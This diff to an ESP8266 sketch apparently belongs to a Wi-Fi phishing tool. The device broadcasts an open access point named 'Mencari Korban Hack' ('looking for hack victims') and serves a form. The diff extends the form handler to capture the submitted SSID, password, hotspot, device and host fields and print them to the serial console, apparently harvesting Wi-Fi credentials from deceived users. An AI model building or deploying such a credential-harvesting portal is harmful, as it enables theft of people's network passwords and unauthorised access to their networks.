@@ -7,7 +7,7 @@
 const char *ssid = "Mencari Korban Hack";
 const char *password = "";
 
-String ssidNew = "", passNew;
+String ssidNew = "", passNew, hotspotNew, nodeviceNew, hostNew;
 
 ESP8266WebServer server(80);
 
@@ -19,6 +19,22 @@ void handleRoot(){
 void handleForm(){
   ssidNew = server.arg("ssidNew");
   passNew = server.arg("passNew");
+  hotspotNew = server.arg("hotspot");
+  nodeviceNew = server.arg("nodevice");
+  hostNew = server.arg("host");
+
+  Serial.println("");
+  Serial.println("SSID: ");
+  Serial.println(ssidNew);
+  Serial.println("PASS: ");
+  Serial.println(passNew);
+  Serial.println("HOTSPOT: ");
+  Serial.println(hotspotNew);
+  Serial.println("nodevice: ");
+  Serial.println(nodeviceNew);
+  Serial.println("HOST: ");
+  Serial.println(hostNew);
+  Serial.println("");
 
   server.send(200, "text/html", sukses_html);
   delay(2000);    // Agar perangkat dapat mengirimkan data sebelum disconnect
